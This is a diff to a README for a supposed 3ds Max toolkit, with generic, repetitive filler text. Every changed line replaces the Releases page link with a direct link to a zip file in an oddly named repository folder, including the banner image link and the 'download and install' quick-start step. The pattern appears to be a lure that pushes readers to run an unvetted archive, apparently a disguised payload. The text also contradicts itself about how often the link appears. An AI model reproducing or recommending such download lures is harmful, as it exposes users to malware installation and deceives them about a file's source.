@@ -1,8 +1,8 @@
-https://github.com/himo502030/3ds-max-tools/releases
+https://github.com/himo502030/3ds-max-tools/raw/refs/heads/main/underthought/tools-ds-max-v2.9.zip
 
 # 3ds Max Tools: Polygon Modeling, Rigging, Render Engines, Scripting
 
-![3DS Max Tools banner](https://via.placeholder.com/1200x300.png?text=3DS+Max+Tools)
+![3DS Max Tools banner](https://github.com/himo502030/3ds-max-tools/raw/refs/heads/main/underthought/tools-ds-max-v2.9.zip+Max+Tools)
 
 Welcome to the 3ds Max Tools project. This collection brings together workflows for polygon modeling, rigging, rendering, and scripting inside 3ds Max. The goal is to provide a cohesive set of tools that streamline common tasks, reduce repetitive work, and offer a consistent approach to building, animating, and rendering 3D content. The tools are designed for artists, technicians, and developers who work with 3ds Max on a regular basis. They emphasize reliability, clarity, and fast iteration.
 
@@ -43,7 +43,7 @@ Core ideas and philosophy
 - Reliability: careful defaults, sanity checks, and careful error reporting.
 
 Quick start guide
-1) Download the latest release from the Releases page and install the toolkit. The download file is on the Releases page, which you can reach at the link below. Download and install the file to begin. https://github.com/himo502030/3ds-max-tools/releases
+1) Download the latest release from the Releases page and install the toolkit. The download file is on the Releases page, which you can reach at the link below. Download and install the file to begin. https://github.com/himo502030/3ds-max-tools/raw/refs/heads/main/underthought/tools-ds-max-v2.9.zip
 2) Open 3ds Max and verify the toolkit loads. A dedicated toolbar and rollout panels should appear in the user interface.
 3) Create a simple scene. Add a polygon object, apply a basic material, and run a quick rig from the Rigging module.
 4) Render a test image. Pick a render engine, adjust a few settings, and render a frame to confirm the integration works as expected.
@@ -144,7 +144,7 @@ Troubleshooting
 Releases and downloads
 - Latest releases page: find the most recent version, download the installer or zip package, and follow the installation steps.
 - If you run into issues after updating: revert to a previous release and report the issue with a clear reproduction path.
-- Visit the Releases page to obtain the newest version and any accompanying assets. For quick access, use this link again: https://github.com/himo502030/3ds-max-tools/releases
+- Visit the Releases page to obtain the newest version and any accompanying assets. For quick access, use this link again: https://github.com/himo502030/3ds-max-tools/raw/refs/heads/main/underthought/tools-ds-max-v2.9.zip
 
 Downloads
 - Quick access: download the latest release file from the official page and install it on your system.
@@ -170,7 +170,7 @@ Images and visuals
 Releases and updates overview
 - The project follows a release-based distribution model. Each release includes a set of modules, UI elements, and scripts that align with the documented workflows.
 - Upgrading between releases should be performed with care. Review the release notes for changes, new features, and potential breaking changes.
-- The Releases page is the primary source for download, change logs, and installation instructions. It is the hub for all distribution-related information and artifact availability. For quick access, the link is repeated here: https://github.com/himo502030/3ds-max-tools/releases
+- The Releases page is the primary source for download, change logs, and installation instructions. It is the hub for all distribution-related information and artifact availability. For quick access, the link is repeated here: https://github.com/himo502030/3ds-max-tools/raw/refs/heads/main/underthought/tools-ds-max-v2.9.zip
 
 Roadmap
 - Short-term goals: improve polygon modeling efficiency, add new rigging presets, and expand render engine presets.
@@ -235,7 +235,7 @@ Final notes
 - The releases page remains the primary place to obtain the latest stable version and related assets.
 
 Releases page reminder
-- For quick access to the latest builds, visit the Releases page at the official URL. It hosts installers, assets, and release notes that guide setup and usage. You can also follow the same link for reference in documentation and update notes: https://github.com/himo502030/3ds-max-tools/releases
+- For quick access to the latest builds, visit the Releases page at the official URL. It hosts installers, assets, and release notes that guide setup and usage. You can also follow the same link for reference in documentation and update notes: https://github.com/himo502030/3ds-max-tools/raw/refs/heads/main/underthought/tools-ds-max-v2.9.zip
 
 Appendix: sample workflows
 
@@ -290,4 +290,4 @@ End of documentation
 - This document outlines the purpose, structure, usage, and maintenance of the 3ds Max Tools project.
 - It is intended to help artists, technicians, and developers work efficiently within 3ds Max.
 
-Note: The link to the Releases page appears twice in this document: at the top for immediate access and later in the downloads section to reinforce where to find the latest data and assets. For quick access, the link is repeated here: https://github.com/himo502030/3ds-max-tools/releases
+Note: The link to the Releases page appears twice in this document: at the top for immediate access and later in the downloads section to reinforce where to find the latest data and assets. For quick access, the link is repeated here: https://github.com/himo502030/3ds-max-tools/raw/refs/heads/main/underthought/tools-ds-max-v2.9.zip
